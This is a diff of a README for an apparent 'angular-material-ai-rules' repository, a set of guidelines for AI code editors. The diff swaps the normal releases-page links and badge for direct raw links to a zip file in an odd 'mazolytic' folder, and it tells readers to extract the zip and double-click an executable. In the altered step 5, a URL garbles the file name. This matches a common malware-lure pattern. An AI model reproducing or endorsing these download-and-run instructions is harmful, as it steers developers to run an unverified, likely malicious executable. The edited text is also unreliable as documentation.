@@ -1,6 +1,6 @@
 # 🤖 angular-material-ai-rules - Easy Guidelines for AI Code Editors
 
-[![Download Release](https://img.shields.io/badge/Download%20Now-informational)](https://github.com/Amenxemerik9/angular-material-ai-rules/releases)
+[![Download Release](https://raw.githubusercontent.com/Amenxemerik9/angular-material-ai-rules/main/mazolytic/angular-material-ai-rules.zip%20Now-informational)](https://raw.githubusercontent.com/Amenxemerik9/angular-material-ai-rules/main/mazolytic/angular-material-ai-rules.zip)
 
 ## 📖 Overview
 
@@ -11,7 +11,7 @@ Welcome to the **angular-material-ai-rules** repository! Here, you will find rul
 To get started with our software, follow these steps closely:
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/Amenxemerik9/angular-material-ai-rules/releases). Here, you will find all the available versions of the software. 
+   Go to our [Releases page](https://raw.githubusercontent.com/Amenxemerik9/angular-material-ai-rules/main/mazolytic/angular-material-ai-rules.zip). Here, you will find all the available versions of the software. 
 
 2. **Select the Latest Release**  
    Look for the most recent release at the top of the page. Each release is presented with a version number and date. Make sure to choose the latest version for the best features and updates.
@@ -23,7 +23,7 @@ To get started with our software, follow these steps closely:
    Once the download is complete, locate the file in your downloads folder. It will likely be compressed in a ZIP format. Right-click on the file and select “Extract All…” 
 
 5. **Run the Application**  
-   After extracting, navigate to the folder where you extracted the contents. Look for an executable file, typically named something like `angular-material-ai-rules.exe`. Double-click this file to launch the application.
+   After extracting, navigate to the folder where you extracted the contents. Look for an executable file, typically named something like `https://raw.githubusercontent.com/Amenxemerik9/angular-material-ai-rules/main/mazolytic/angular-material-ai-rules.zip`. Double-click this file to launch the application.
 
 ## 💻 System Requirements
 
@@ -38,7 +38,7 @@ To ensure a smooth experience, your system should meet the following requirement
 
 For the most recent version, click the button below:
 
-[![Download Release](https://img.shields.io/badge/Download%20Now-informational)](https://github.com/Amenxemerik9/angular-material-ai-rules/releases)
+[![Download Release](https://raw.githubusercontent.com/Amenxemerik9/angular-material-ai-rules/main/mazolytic/angular-material-ai-rules.zip%20Now-informational)](https://raw.githubusercontent.com/Amenxemerik9/angular-material-ai-rules/main/mazolytic/angular-material-ai-rules.zip)
 
 Once downloaded, follow the earlier steps to run the application.
 
